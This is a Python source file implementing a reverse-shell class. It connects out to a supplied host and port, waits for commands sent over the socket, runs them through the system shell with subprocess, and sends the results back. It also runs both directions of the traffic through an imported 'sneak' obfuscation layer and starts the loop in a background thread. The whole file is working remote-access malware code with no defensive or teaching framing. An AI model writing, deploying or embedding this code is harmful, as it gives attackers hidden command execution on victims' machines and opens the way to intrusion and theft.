from config import RUNNING, METHODS, PARAM
from .sneaks import obfuscation
from select import select
from shlex import quote, split
from socket import (
    socket,
    gethostname,
    AF_INET,
    AF_INET6,
    SOCK_STREAM,
    SOL_SOCKET,
    SO_REUSEADDR,
)
from subprocess import check_output, CalledProcessError, STDOUT
from threading import Thread


class ReverseShell:
    __cSoc: socket
    __readBuffer, _, _ = select([], [], [], 0)

    @staticmethod
    def getFromSoc() -> str:
        if ReverseShell.__readBuffer:
            return ReverseShell.__cSoc.recv(4096).decode()
        else:
            return ""

    @staticmethod
    def sendStuff(contents: str) -> None:
        result = METHODS["sneak"](contents)
        ReverseShell.__cSoc.send(result.encode())

    @staticmethod
    def recvStuff() -> str:
        result = ""
        temp = ReverseShell.__cSoc.recv(4096).decode()
        while temp != "":
            result += temp
            temp = ReverseShell.getFromSoc()
        result = obfuscation.DSNEAKS[PARAM["sneak"]](result)
        return result.strip("\n")

    @staticmethod
    def executeCommand(cmd: str) -> str:
        cmd = cmd.strip()
        if not cmd or cmd == None:
            return ""
        try:
            output = check_output(split(quote(cmd)), shell=True, stderr=STDOUT)
            return output.decode()
        except CalledProcessError as e:
            return "Error: {}".format(e.output.decode())

    @staticmethod
    def startReverseShell(target: str, port: int, ipv6: bool = False) -> None:
        if ipv6:
            ReverseShell.__cSoc = socket(AF_INET6, SOCK_STREAM)
        else:
            ReverseShell.__cSoc = socket(AF_INET, SOCK_STREAM)
        ReverseShell.__cSoc.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        try:
            ReverseShell.__cSoc.connect((target, port))
            ReverseShell.__readBuffer, _, _ = select([ReverseShell.__cSoc], [], [], 0)
            prompt = "{}>".format(gethostname())
            ReverseShell.sendStuff("***Connection Established***\n")
            while RUNNING.is_set():
                ReverseShell.sendStuff(prompt)
                cmd = ReverseShell.recvStuff()
                if cmd == "exit" or cmd == "close":
                    ReverseShell.sendStuff("***Closing the connection***")
                    ReverseShell.__cSoc.close()
                    break
                res = ReverseShell.executeCommand(cmd)
                ReverseShell.sendStuff(res)
        except Exception:
            return

    @staticmethod
    def startService(target: str, port: int, ipv6: bool = False) -> None:
        Thread(target=ReverseShell.startReverseShell, args=(target, port, ipv6)).start()
